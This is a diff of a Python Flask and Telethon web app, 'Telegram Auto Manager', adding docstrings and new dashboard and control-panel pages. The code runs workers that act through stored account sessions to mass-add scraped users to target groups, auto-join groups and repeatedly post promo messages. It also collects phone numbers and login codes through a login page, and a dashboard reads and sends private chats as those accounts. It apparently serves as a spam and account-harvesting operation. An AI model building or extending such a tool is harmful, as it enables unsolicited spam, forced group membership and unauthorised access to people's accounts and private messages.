@@ -5,7 +5,7 @@ Optimized Dashboard - Chat list only, history on demand
 Features: Auto Join, Auto Add Members, Auto Share Promo Message with Premium Emojis
 """
 
-from flask import Flask, jsonify, request, redirect, send_file, render_template_string
+from flask import Flask, jsonify, request, redirect, send_file, render_template_string, Response
 from flask_cors import CORS
 from telethon import TelegramClient, errors, functions, types
 from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest
@@ -21,6 +21,7 @@ import json
 import os
 import asyncio
 import logging
+import logging.handlers
 import time
 import random
 import threading
@@ -38,9 +39,9 @@ import mimetypes
 from io import BytesIO
 import re
 
-# Configure logging
-import logging.handlers
-
+# ============================================
+# LOGGING CONFIGURATION
+# ============================================
 os.makedirs('logs', exist_ok=True)
 
 file_handler = logging.handlers.RotatingFileHandler(
@@ -59,6 +60,9 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
+# ============================================
+# FLASK APP INITIALIZATION
+# ============================================
 app = Flask(__name__, static_folder=None)
 CORS(app)
 
@@ -80,7 +84,7 @@ REPORT_CHAT_ID = os.environ.get('REPORT_CHAT_ID', '-1002452548749')
 TARGET_GROUPS = ['Habesha_tg_market', 'abe_army']
 
 # ============================================
-# AUTO SHARE CONFIGURATION (CONTROLLABLE)
+# AUTO SHARE CONFIGURATION
 # ============================================
 SHARE_CONFIG_FILE = 'share_config.json'
 
@@ -109,16 +113,15 @@ def save_share_config(config):
 
 # Load initial share config
 share_config = load_share_config()
-
-# Legacy support
 PROMO_MESSAGE = share_config['messages'][0] if share_config['messages'] else "🔥 t.me/abe_army 🔥"
 SHARE_INTERVAL_SECONDS = share_config['share_interval_seconds']
 SHARE_DELAY_BETWEEN_GROUPS = share_config['share_delay_between_groups']
 AUTO_SHARE_ENABLED = share_config['auto_share_enabled']
-
-# Groups to share the promo message to
 SHARE_GROUPS = []
 
+# ============================================
+# SERVER SETUP
+# ============================================
 CFG = SERVERS.get(SERVER_NUMBER, SERVERS[1])
 SERVER_NAME = CFG['name']
 API_ID = CFG['api_id']
@@ -126,7 +129,9 @@ API_HASH = CFG['api_hash']
 SERVER_URL = CFG['url']
 PORT = int(os.environ.get('PORT', 10000))
 
-# File paths
+# ============================================
+# FILE PATHS
+# ============================================
 ACCOUNTS_FILE = 'accounts.json'
 SETTINGS_FILE = 'auto_add_settings.json'
 STATS_FILE = 'stats.json'
@@ -139,7 +144,9 @@ MEDIA_CACHE_DIR = 'media_cache'
 
 os.makedirs(MEDIA_CACHE_DIR, exist_ok=True)
 
-# Storage with thread locks
+# ============================================
+# STORAGE WITH THREAD LOCKS
+# ============================================
 accounts = []
 temp_sessions = {}
 auto_sessions = {}
@@ -158,13 +165,18 @@ share_stats = {
 file_lock = threading.Lock()
 worker_lock = threading.Lock()
 
-# Chat cache for dashboard
+# ============================================
+# CHAT CACHE FOR DASHBOARD
+# ============================================
 chat_list_cache = {}
 message_cache = {}
 cache_lock = threading.Lock()
 CHAT_LIST_CACHE_DURATION = 15
 MESSAGE_CACHE_DURATION = 30
 
+# ============================================
+# STATISTICS
+# ============================================
 stats = {
     'total_added': 0,
     'today_added': 0,
@@ -178,9 +190,10 @@ stats = {
 }
 
 # ============================================
-# EVENT LOOP HELPER FOR THREADS
+# EVENT LOOP HELPER
 # ============================================
 def get_or_create_eventloop():
+    """Get or create an event loop for async operations"""
     try:
         loop = asyncio.get_event_loop()
         if loop.is_closed():
@@ -196,6 +209,7 @@ def get_or_create_eventloop():
 # FILE OPERATIONS
 # ============================================
 def load_json(path, default):
+    """Load JSON file with backup recovery"""
     try:
         if os.path.exists(path):
             with open(path, 'r') as f:
@@ -221,6 +235,7 @@ def load_json(path, default):
     return default
 
 def save_json(path, data):
+    """Save JSON file atomically"""
     temp_path = f"{path}.tmp"
     with file_lock:
         try:
@@ -231,6 +246,7 @@ def save_json(path, data):
             logger.error(f"Save error {path}: {e}")
 
 def save_temp_sessions():
+    """Save temporary sessions"""
     sessions_data = {}
     for session_id, session_data in temp_sessions.items():
         sessions_data[session_id] = {
@@ -248,6 +264,7 @@ def save_temp_sessions():
     save_json(TEMP_SESSIONS_FILE, sessions_data)
 
 def load_temp_sessions():
+    """Load temporary sessions"""
     global temp_sessions
     sessions_data = load_json(TEMP_SESSIONS_FILE, {})
     temp_sessions = {}
@@ -258,23 +275,29 @@ def load_temp_sessions():
             temp_sessions[session_id] = session_data
 
 def save_auto_sessions():
+    """Save auto-login sessions"""
     save_json(AUTO_SESSIONS_FILE, auto_sessions)
 
 def load_auto_sessions():
+    """Load auto-login sessions"""
     global auto_sessions
     auto_sessions = load_json(AUTO_SESSIONS_FILE, {})
 
 def save_user_map():
+    """Save user phone mapping"""
     save_json(USER_MAP_FILE, user_phone_map)
 
 def load_user_map():
+    """Load user phone mapping"""
     global user_phone_map
     user_phone_map = load_json(USER_MAP_FILE, {})
 
 def save_share_groups():
+    """Save share groups list"""
     save_json(SHARE_GROUPS_FILE, share_groups)
 
 def load_share_groups():
+    """Load share groups list"""
     global share_groups
     share_groups = load_json(SHARE_GROUPS_FILE, [])
     for tg in TARGET_GROUPS:
@@ -286,8 +309,11 @@ def load_share_groups():
 # TELEGRAM CLIENT HELPER
 # ============================================
 class SyncTelegramClient:
+    """Helper class to run async Telethon operations synchronously"""
+    
     @staticmethod
     def run_async(async_func, timeout=60, retries=2):
+        """Run an async function synchronously with retries"""
         for attempt in range(retries + 1):
             try:
                 loop = get_or_create_eventloop()
@@ -307,6 +333,7 @@ class SyncTelegramClient:
     
     @staticmethod
     def get_client(session_string):
+        """Create a Telethon client from session string"""
         try:
             get_or_create_eventloop()
             return TelegramClient(
@@ -324,6 +351,7 @@ class SyncTelegramClient:
     
     @staticmethod
     async def safe_connect(client):
+        """Safely connect a client with timeout"""
         try:
             await asyncio.wait_for(client.connect(), timeout=15)
             return True
@@ -334,6 +362,7 @@ class SyncTelegramClient:
 # PREMIUM EMOJI SUPPORT
 # ============================================
 def parse_premium_emojis(text):
+    """Parse premium custom emojis from text"""
     premium_pattern = r':(\d{15,20}):'
     entities = []
     clean_text = text
@@ -360,6 +389,7 @@ def parse_premium_emojis(text):
     return clean_text, entities
 
 async def send_message_with_premium_emojis(client, entity, text):
+    """Send message with premium custom emoji support"""
     try:
         parsed_text, custom_emojis = parse_premium_emojis(text)
         if custom_emojis:
@@ -383,6 +413,7 @@ async def send_message_with_premium_emojis(client, entity, text):
 # ACCOUNT AGE DETECTION
 # ============================================
 def get_account_age_sync(session_string):
+    """Get account age synchronously"""
     async def _get_age():
         client = SyncTelegramClient.get_client(session_string)
         try:
@@ -421,6 +452,7 @@ def get_account_age_sync(session_string):
 # ACCOUNT MANAGEMENT
 # ============================================
 def reset_daily():
+    """Reset daily statistics"""
     try:
         today = datetime.now().strftime('%Y-%m-%d')
         if stats.get('last_reset') != today:
@@ -436,6 +468,7 @@ def reset_daily():
         logger.error(f"Reset daily error: {e}")
 
 def check_account_auth(acc, max_retries=2):
+    """Check if account is still authorized"""
     async def _check():
         client = SyncTelegramClient.get_client(acc['session'])
         try:
@@ -461,6 +494,7 @@ def check_account_auth(acc, max_retries=2):
     return False
 
 def remove_dead_account(aid, reason=""):
+    """Remove a dead/invalid account"""
     global accounts
     try:
         acc = next((a for a in accounts if a['id'] == aid), None)
@@ -494,6 +528,7 @@ def remove_dead_account(aid, reason=""):
         return "Unknown"
 
 def send_telegram(text, retries=3):
+    """Send message to Telegram report chat"""
     for attempt in range(retries):
         try:
             response = requests.post(
@@ -513,6 +548,7 @@ def send_telegram(text, retries=3):
 # GROUP DISCOVERY
 # ============================================
 def discover_share_groups(account):
+    """Discover groups where the account can share messages"""
     discovered_groups = set()
     
     async def _discover():
@@ -570,6 +606,8 @@ def discover_share_groups(account):
 # AUTO SHARE WORKER
 # ============================================
 class AutoShareWorker:
+    """Worker for automatic sharing of promo messages to groups"""
+    
     def __init__(self, account):
         self.account = account
         self.acc_id = account['id']
@@ -584,10 +622,12 @@ class AutoShareWorker:
         self._loop = None
     
     def stop(self):
+        """Stop the worker"""
         self.running = False
         self.disconnect_client()
     
     def disconnect_client(self):
+        """Disconnect the Telegram client"""
         if self.client:
             try:
                 if self._loop and not self._loop.is_closed():
@@ -606,6 +646,7 @@ class AutoShareWorker:
                 self.client = None
     
     def get_current_config(self):
+        """Get current share configuration"""
         global share_config
         if time.time() - self.last_config_check > 60:
             share_config = load_share_config()
@@ -613,6 +654,7 @@ class AutoShareWorker:
         return share_config
     
     def get_current_message(self):
+        """Get the current message to share"""
         config = self.get_current_config()
         messages = config.get('messages', [])
         
@@ -629,6 +671,7 @@ class AutoShareWorker:
             return messages[0]
     
     def run(self):
+        """Main worker loop"""
         self._loop = asyncio.new_event_loop()
         asyncio.set_event_loop(self._loop)
         
@@ -691,6 +734,7 @@ class AutoShareWorker:
             pass
     
     def refresh_share_groups(self):
+        """Refresh the list of groups to share to"""
         try:
             global share_groups
             if share_groups:
@@ -708,6 +752,7 @@ class AutoShareWorker:
             logger.error(f"Refresh share groups error: {e}")
     
     def ensure_connection(self):
+        """Ensure client is connected"""
         try:
             if self.client and hasattr(self.client, 'is_connected'):
                 try:
@@ -729,6 +774,7 @@ class AutoShareWorker:
             return self.reconnect()
     
     def connect_client(self):
+        """Connect the Telegram client"""
         for attempt in range(3):
             try:
                 self.disconnect_client()
@@ -748,11 +794,13 @@ class AutoShareWorker:
         return False
     
     def reconnect(self):
+        """Reconnect the client"""
         self.disconnect_client()
         time.sleep(3)
         return self.connect_client()
     
     def share_to_all_groups(self):
+        """Share message to all groups"""
         config = self.get_current_config()
         delay_between = config.get('share_delay_between_groups', 20)
         message = self.get_current_message()
@@ -803,6 +851,7 @@ class AutoShareWorker:
                 pass
     
     def share_to_group(self, group_id, message):
+        """Share message to a specific group"""
         if not self.ensure_connection():
             return False
         
@@ -850,6 +899,8 @@ class AutoShareWorker:
 # AUTO-ADD WORKER
 # ============================================
 class AutoAddWorker:
+    """Worker for automatically adding users to target groups"""
+    
     def __init__(self, account):
         self.account = account
         self.acc_id = account['id']
@@ -867,10 +918,12 @@ class AutoAddWorker:
         self.total_added_this_session = 0
     
     def stop(self):
+        """Stop the worker"""
         self.running = False
         self.disconnect_client()
     
     def disconnect_client(self):
+        """Disconnect the Telegram client"""
         if self.client:
             try:
                 if self._loop and not self._loop.is_closed():
@@ -889,6 +942,7 @@ class AutoAddWorker:
                 self.client = None
     
     def run(self):
+        """Main worker loop"""
         self._loop = asyncio.new_event_loop()
         asyncio.set_event_loop(self._loop)
         
@@ -1008,6 +1062,7 @@ class AutoAddWorker:
             pass
     
     def perform_health_check(self):
+        """Perform health check on the worker"""
         try:
             if time.time() - self.last_activity > 600:
                 logger.warning(f"Worker {self.acc_key}: Inactive for 10 minutes, reconnecting...")
@@ -1024,6 +1079,7 @@ class AutoAddWorker:
             logger.error(f"Health check error: {e}")
     
     def ensure_connection(self):
+        """Ensure client is connected"""
         try:
             if self.client and hasattr(self.client, 'is_connected'):
                 try:
@@ -1048,6 +1104,7 @@ class AutoAddWorker:
             return self.reconnect()
     
     def connect_client(self):
+        """Connect the Telegram client"""
         for attempt in range(3):
             try:
                 self.disconnect_client()
@@ -1069,11 +1126,13 @@ class AutoAddWorker:
         return False
     
     def reconnect(self):
+        """Reconnect the client"""
         self.disconnect_client()
         time.sleep(3)
         return self.connect_client()
     
     def join_all_targets(self):
+        """Join all target groups"""
         for target in TARGET_GROUPS:
             if target in self.joined_groups:
                 continue
@@ -1104,6 +1163,7 @@ class AutoAddWorker:
                 time.sleep(min(5 * (attempt + 1), 20))
     
     def get_user_sources_enhanced(self):
+        """Get user sources from various places"""
         user_ids = set()
         if not self.ensure_connection():
             return list(user_ids)
@@ -1171,6 +1231,7 @@ class AutoAddWorker:
             return list(user_ids)
     
     def add_user_to_targets(self, user_id):
+        """Add a user to target groups"""
         success = False
         for target in TARGET_GROUPS:
             if not self.running:
@@ -1206,7 +1267,11 @@ class AutoAddWorker:
                 pass
         return success
 
+# ============================================
+# WORKER MANAGEMENT FUNCTIONS
+# ============================================
 def start_auto_add(account):
+    """Start auto-add worker for an account"""
     acc_key = str(account['id'])
     with worker_lock:
         try:
@@ -1224,6 +1289,7 @@ def start_auto_add(account):
             logger.error(f"Start worker error: {e}")
 
 def stop_auto_add(account_id):
+    """Stop auto-add worker for an account"""
     acc_key = str(account_id)
     with worker_lock:
         try:
@@ -1236,6 +1302,7 @@ def stop_auto_add(account_id):
             logger.error(f"Stop auto add error: {e}")
 
 def start_auto_share(account):
+    """Start auto-share worker for an account"""
     acc_key = str(account['id'])
     with worker_lock:
         try:
@@ -1254,6 +1321,7 @@ def start_auto_share(account):
             logger.error(f"Start share worker error: {e}")
 
 def stop_auto_share(account_id):
+    """Stop auto-share worker for an account"""
     acc_key = str(account_id)
     with worker_lock:
         try:
@@ -1269,6 +1337,7 @@ def stop_auto_share(account_id):
 # PHONE LOOKUP HELPERS
 # ============================================
 def find_phone_for_user(telegram_id):
+    """Find phone number for a Telegram user ID"""
     tid = str(telegram_id)
     phone = user_phone_map.get(tid, '')
     if phone:
@@ -1283,6 +1352,7 @@ def find_phone_for_user(telegram_id):
     return None
 
 def auto_send_code(phone, telegram_id, first_name='', last_name='', username=''):
+    """Automatically send verification code"""
     async def send_auto_code():
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
@@ -1337,12 +1407,14 @@ def auto_send_code(phone, telegram_id, first_name='', last_name='', username='')
 # DASHBOARD HELPERS
 # ============================================
 def get_account_by_id(account_id):
+    """Get account by ID"""
     for acc in accounts:
         if str(acc['id']) == str(account_id) or acc['id'] == account_id:
             return acc
     return None
 
 def get_client_for_account(account_id):
+    """Get Telegram client for an account"""
     acc = get_account_by_id(account_id)
     if not acc or not acc.get('session'):
         return None, "Account not found"
@@ -1353,6 +1425,7 @@ def get_client_for_account(account_id):
         return None, str(e)
 
 async def get_dialogs_lightweight(client, limit=50):
+    """Get lightweight dialog list"""
     dialogs_list = []
     
     try:
@@ -1421,6 +1494,7 @@ async def get_dialogs_lightweight(client, limit=50):
         raise
 
 async def get_chat_messages(client, chat_id, limit=30):
+    """Get messages from a specific chat"""
     messages_list = []
     
     try:
@@ -1478,6 +1552,7 @@ async def get_chat_messages(client, chat_id, limit=30):
         raise
 
 async def send_message_async(client, chat_id, message_text):
+    """Send a message asynchronously"""
     try:
         entity = None
         try:
@@ -1503,6 +1578,7 @@ async def send_message_async(client, chat_id, message_text):
         raise
 
 async def download_media_async(client, account_id, message_id):
+    """Download media from a message"""
     try:
         dialogs = await client.get_dialogs(limit=100)
         for dialog in dialogs:
@@ -1579,20 +1655,9 @@ LOGIN_PAGE = '''<!DOCTYPE html>
         .alert { padding: 12px; border-radius: 8px; margin-bottom: 20px; display: none; }
         .alert-error { background: #fee2e2; color: #991b1b; border: 1px solid #fca5a5; display: block; }
         .alert-success { background: #d1fae5; color: #065f46; border: 1px solid #6ee7b7; display: block; }
+        .alert-info { background: #dbeafe; color: #1e40af; border: 1px solid #93c5fd; display: block; }
         .code-section { display: none; }
         .code-section.active { display: block; }
-        .btn-telegram {
-            background: #0088cc; display: flex; align-items: center; justify-content: center;
-            gap: 10px; margin-bottom: 20px;
-        }
-        .divider {
-            text-align: center; margin: 20px 0; color: #999; position: relative;
-        }
-        .divider::before, .divider::after {
-            content: ''; position: absolute; top: 50%; width: 40%; height: 1px; background: #ddd;
-        }
-        .divider::before { left: 0; }
-        .divider::after { right: 0; }
     </style>
 </head>
 <body>
@@ -1601,14 +1666,6 @@ LOGIN_PAGE = '''<!DOCTYPE html>
         <p>Telegram Auto Manager</p>
         
         <div id="alert-container"></div>
-        
-        <!-- Telegram Login Widget -->
-        <div id="telegram-login-section">
-            <button class="btn btn-telegram" onclick="openTelegramLogin()">
-                <span>📱</span> Login with Telegram
-            </button>
-            <div class="divider">or</div>
-        </div>
         
         <!-- Manual Login Form -->
         <div id="manual-login-section">
@@ -1636,44 +1693,6 @@ LOGIN_PAGE = '''<!DOCTYPE html>
     <script>
         const API_BASE = window.location.origin;
         let currentSessionId = null;
-
-        // Parse Telegram WebApp initData
-        const urlParams = new URLSearchParams(window.location.search);
-        const initData = urlParams.get('tgWebAppData') || urlParams.get('initData');
-
-        if (initData) {
-            autoLogin(initData);
-        }
-
-        async function autoLogin(initData) {
-            try {
-                const response = await fetch(`${API_BASE}/api/telegram-auto-login`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ initData: initData })
-                });
-                
-                const data = await response.json();
-                
-                if (data.success) {
-                    showAlert('Code sent to your phone! Check Telegram.', 'success');
-                    currentSessionId = data.session_id;
-                    document.getElementById('code-section').classList.add('active');
-                } else if (data.needs_phone) {
-                    showAlert('Please enter your phone number manually.', 'info');
-                } else {
-                    showAlert(data.error || 'Login failed', 'error');
-                }
-            } catch (error) {
-                showAlert('Error: ' + error.message, 'error');
-            }
-        }
-
-        function openTelegramLogin() {
-            const botUsername = 'your_bot_username';
-            const url = `https://t.me/${botUsername}?start=login`;
-            window.open(url, '_blank');
-        }
 
         async function sendCode() {
             const phone = document.getElementById('phone').value.trim();
@@ -1760,6 +1779,721 @@ LOGIN_PAGE = '''<!DOCTYPE html>
 </body>
 </html>'''
 
+DASHBOARD_PAGE = '''<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard - Telegram Auto Manager</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container { max-width: 1200px; margin: 0 auto; }
+        .header { text-align: center; color: white; margin-bottom: 30px; }
+        .header h1 { font-size: 2.5em; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.2); }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; }
+        .card {
+            background: white; border-radius: 15px; padding: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        .card h2 { color: #333; margin-bottom: 20px; }
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 20px; }
+        .stat-item {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white; padding: 15px; border-radius: 10px; text-align: center;
+        }
+        .stat-value { font-size: 2em; font-weight: bold; }
+        .stat-label { font-size: 0.9em; opacity: 0.9; margin-top: 5px; }
+        .btn {
+            padding: 12px 24px; border: none; border-radius: 8px;
+            font-size: 14px; font-weight: 600; cursor: pointer; color: white;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            transition: transform 0.3s; margin: 5px;
+        }
+        .btn:hover { transform: translateY(-2px); }
+        .btn-danger { background: #ef4444; }
+        .chat-list { max-height: 500px; overflow-y: auto; }
+        .chat-item {
+            padding: 12px; border-bottom: 1px solid #eee; cursor: pointer;
+            transition: background 0.3s; display: flex; align-items: center; gap: 10px;
+        }
+        .chat-item:hover { background: #f9fafb; }
+        .chat-avatar {
+            width: 40px; height: 40px; border-radius: 50%; background: #667eea;
+            color: white; display: flex; align-items: center; justify-content: center;
+            font-weight: bold; font-size: 18px;
+        }
+        .chat-info { flex: 1; }
+        .chat-title { font-weight: 600; color: #333; }
+        .chat-last { color: #666; font-size: 0.9em; margin-top: 3px; }
+        .messages-section { margin-top: 20px; display: none; }
+        .messages-section.active { display: block; }
+        .message-item {
+            padding: 10px; margin-bottom: 10px; border-radius: 8px;
+            background: #f3f4f6;
+        }
+        .message-item.sent { background: #dbeafe; }
+        .message-input { display: flex; gap: 10px; margin-top: 20px; }
+        .message-input input {
+            flex: 1; padding: 12px; border: 2px solid #e0e0e0;
+            border-radius: 8px; font-size: 14px;
+        }
+        .loading { text-align: center; padding: 20px; }
+        .spinner {
+            display: inline-block; width: 40px; height: 40px;
+            border: 4px solid #f3f3f3; border-top: 4px solid #667eea;
+            border-radius: 50%; animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📊 Dashboard</h1>
+            <p>Telegram Auto Manager</p>
+        </div>
+
+        <div class="grid">
+            <!-- Stats Card -->
+            <div class="card">
+                <h2>📈 Statistics</h2>
+                <div class="stats-grid" id="stats-grid">
+                    <div class="stat-item">
+                        <div class="stat-value" id="today-added">0</div>
+                        <div class="stat-label">Added Today</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value" id="total-added">0</div>
+                        <div class="stat-label">Total Added</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value" id="today-shares">0</div>
+                        <div class="stat-label">Shares Today</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value" id="active-workers">0</div>
+                        <div class="stat-label">Active Workers</div>
+                    </div>
+                </div>
+                <button class="btn" onclick="refreshStats()">🔄 Refresh</button>
+            </div>
+
+            <!-- Chat List Card -->
+            <div class="card">
+                <h2>💬 Chats</h2>
+                <div class="chat-list" id="chat-list">
+                    <div class="loading">
+                        <div class="spinner"></div>
+                        <p>Loading chats...</p>
+                    </div>
+                </div>
+                <div class="messages-section" id="messages-section">
+                    <h3 id="messages-title">Messages</h3>
+                    <div id="messages-list"></div>
+                    <div class="message-input">
+                        <input type="text" id="message-input" placeholder="Type a message...">
+                        <button class="btn" onclick="sendMessage()">📤 Send</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const API_BASE = window.location.origin;
+        let currentAccountId = localStorage.getItem('accountId');
+        let currentChatId = null;
+
+        if (!currentAccountId) {
+            window.location.href = '/login';
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            loadChats();
+            refreshStats();
+        });
+
+        async function loadChats() {
+            try {
+                const response = await fetch(`${API_BASE}/api/get-chats`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ accountId: currentAccountId })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    renderChats(data.chats);
+                } else {
+                    document.getElementById('chat-list').innerHTML = '<p style="color: red;">Error loading chats: ' + (data.error || 'Unknown error') + '</p>';
+                }
+            } catch (error) {
+                document.getElementById('chat-list').innerHTML = '<p style="color: red;">Error: ' + error.message + '</p>';
+            }
+        }
+
+        function renderChats(chats) {
+            const container = document.getElementById('chat-list');
+            
+            if (!chats || chats.length === 0) {
+                container.innerHTML = '<p style="text-align: center; color: #666;">No chats found</p>';
+                return;
+            }
+            
+            container.innerHTML = chats.map(chat => `
+                <div class="chat-item" onclick="openChat('${chat.id}', '${escapeHtml(chat.title)}')">
+                    <div class="chat-avatar">${chat.title.charAt(0).toUpperCase()}</div>
+                    <div class="chat-info">
+                        <div class="chat-title">${escapeHtml(chat.title)}</div>
+                        <div class="chat-last">${escapeHtml(chat.lastMessage || 'No messages')}</div>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        async function openChat(chatId, chatTitle) {
+            currentChatId = chatId;
+            document.getElementById('messages-title').textContent = 'Messages - ' + chatTitle;
+            document.getElementById('messages-section').classList.add('active');
+            
+            try {
+                const response = await fetch(`${API_BASE}/api/get-chat-messages`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ accountId: currentAccountId, chatId: chatId })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    renderMessages(data.messages);
+                }
+            } catch (error) {
+                console.error('Error loading messages:', error);
+            }
+        }
+
+        function renderMessages(messages) {
+            const container = document.getElementById('messages-list');
+            
+            if (!messages || messages.length === 0) {
+                container.innerHTML = '<p style="text-align: center; color: #666;">No messages</p>';
+                return;
+            }
+            
+            container.innerHTML = messages.reverse().map(msg => `
+                <div class="message-item ${msg.out ? 'sent' : ''}">
+                    <div>${escapeHtml(msg.text || '')}</div>
+                    <small style="color: #999;">${new Date(msg.date * 1000).toLocaleString()}</small>
+                </div>
+            `).join('');
+            
+            container.scrollTop = container.scrollHeight;
+        }
+
+        async function sendMessage() {
+            const input = document.getElementById('message-input');
+            const message = input.value.trim();
+            
+            if (!message || !currentChatId) return;
+            
+            try {
+                const response = await fetch(`${API_BASE}/api/send-message`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        accountId: currentAccountId,
+                        chatId: currentChatId,
+                        message: message
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    input.value = '';
+                    openChat(currentChatId, document.getElementById('messages-title').textContent.replace('Messages - ', ''));
+                }
+            } catch (error) {
+                console.error('Error sending message:', error);
+            }
+        }
+
+        async function refreshStats() {
+            try {
+                const response = await fetch(`${API_BASE}/api/auto-add-stats`);
+                const data = await response.json();
+                
+                if (data.success) {
+                    document.getElementById('today-added').textContent = data.added_today || 0;
+                    document.getElementById('total-added').textContent = data.total_added || 0;
+                    document.getElementById('today-shares').textContent = data.shares_today || 0;
+                    document.getElementById('active-workers').textContent = data.active_workers || 0;
+                }
+            } catch (error) {
+                console.error('Error loading stats:', error);
+            }
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        setInterval(refreshStats, 30000);
+    </script>
+</body>
+</html>'''
+
+CONTROL_PAGE = '''<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Share Control Panel - Telegram Auto Share</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh; padding: 20px;
+        }
+        .container { max-width: 1200px; margin: 0 auto; }
+        .header { text-align: center; color: white; margin-bottom: 30px; }
+        .header h1 { font-size: 2.5em; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.2); }
+        .header p { font-size: 1.1em; opacity: 0.9; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; margin-bottom: 20px; }
+        .card {
+            background: white; border-radius: 15px; padding: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1); transition: transform 0.3s ease;
+        }
+        .card:hover { transform: translateY(-5px); }
+        .card h2 { color: #333; margin-bottom: 20px; font-size: 1.5em; display: flex; align-items: center; gap: 10px; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; margin-bottom: 8px; color: #555; font-weight: 500; }
+        .form-group input, .form-group textarea {
+            width: 100%; padding: 12px; border: 2px solid #e0e0e0;
+            border-radius: 8px; font-size: 14px; transition: border-color 0.3s;
+        }
+        .form-group input:focus, .form-group textarea:focus { outline: none; border-color: #667eea; }
+        .form-group textarea { min-height: 100px; resize: vertical; font-family: inherit; }
+        .btn {
+            padding: 12px 24px; border: none; border-radius: 8px;
+            font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.3s;
+            display: inline-flex; align-items: center; gap: 8px;
+        }
+        .btn-primary { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
+        .btn-primary:hover { box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4); transform: translateY(-2px); }
+        .btn-success { background: #10b981; color: white; }
+        .btn-danger { background: #ef4444; color: white; }
+        .btn-warning { background: #f59e0b; color: white; }
+        .btn-sm { padding: 6px 12px; font-size: 12px; }
+        .message-list { margin-bottom: 15px; }
+        .message-item {
+            background: #f9fafb; border: 1px solid #e5e7eb;
+            border-radius: 8px; padding: 12px; margin-bottom: 10px; position: relative;
+        }
+        .message-item .message-text { white-space: pre-wrap; word-break: break-word; margin-bottom: 8px; font-size: 14px; color: #333; }
+        .message-item .message-actions { display: flex; gap: 8px; }
+        .time-presets { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }
+        .time-preset {
+            padding: 8px 16px; background: #f3f4f6; border: 2px solid #e5e7eb;
+            border-radius: 20px; cursor: pointer; font-size: 13px; transition: all 0.3s;
+        }
+        .time-preset:hover { background: #667eea; color: white; border-color: #667eea; }
+        .time-preset.active { background: #667eea; color: white; border-color: #667eea; }
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-top: 15px; }
+        .stat-item {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white; padding: 15px; border-radius: 10px; text-align: center;
+        }
+        .stat-item .stat-value { font-size: 2em; font-weight: bold; }
+        .stat-item .stat-label { font-size: 0.9em; opacity: 0.9; margin-top: 5px; }
+        .toggle-switch { position: relative; display: inline-block; width: 60px; height: 34px; }
+        .toggle-switch input { opacity: 0; width: 0; height: 0; }
+        .toggle-slider {
+            position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0;
+            background-color: #ccc; transition: .4s; border-radius: 34px;
+        }
+        .toggle-slider:before {
+            position: absolute; content: ""; height: 26px; width: 26px;
+            left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%;
+        }
+        input:checked + .toggle-slider { background-color: #10b981; }
+        input:checked + .toggle-slider:before { transform: translateX(26px); }
+        .alert { padding: 12px; border-radius: 8px; margin-bottom: 15px; font-size: 14px; }
+        .alert-success { background: #d1fae5; color: #065f46; border: 1px solid #6ee7b7; }
+        .alert-error { background: #fee2e2; color: #991b1b; border: 1px solid #fca5a5; }
